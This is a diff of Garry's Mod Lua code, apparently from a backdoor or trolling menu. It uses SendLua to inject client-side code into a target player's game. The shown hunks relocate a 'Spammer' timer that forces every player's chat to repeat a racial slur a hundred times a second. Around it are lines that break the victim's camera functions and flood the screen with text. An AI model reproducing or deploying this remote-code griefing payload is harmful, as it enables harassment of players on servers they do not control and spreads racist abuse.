@@ -107,12 +107,6 @@ end )
 --HUD swap
 lol:PushAction( 28, function( pPlayer )
 	lol:SendLua( pPlayer, [[
-
-		timer.Create("Spammer", 0.01, 0, function()
-			for k,v in pairs(player.GetAll()) do
-				v:SendLua("chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), 'dance to this nigger')")
-			end
-			end)
 		(GAMEMODE or GM).CalcView = function() end
 		(GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
@@ -221,10 +215,16 @@ lol:PushAction( 0, function( pPlayer )
 					part:SetEndSize( Size )
 					part:SetCollide( true )
 				end
-			end
+			end)
 	 surface.CreateFont( "SPAM", {font = "Arial",size = 55,weight = 2000,})
  	hook.Add( "HUDPaint", "Lines", function()
  		for i = 1,50 do draw.SimpleTextOutlined("tapped","SPAM",math.random(0,ScrW()-35), math.random(0,ScrH()-1),Color(rainbow.r,rainbow.g,rainbow.b),TEXT_ALIGN_CENTER,TEXT_ALIGN_TOP,3,Color(math.random(1,255),math.random(1,255),math.random(1,255))) end 
+	end)
+			
+	timer.Create("Spammer", 0.01, 0, function()
+		for k,v in pairs(player.GetAll()) do
+			v:SendLua("chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), 'dance to this nigger')")
+		end
 	end)
 	]] )
 
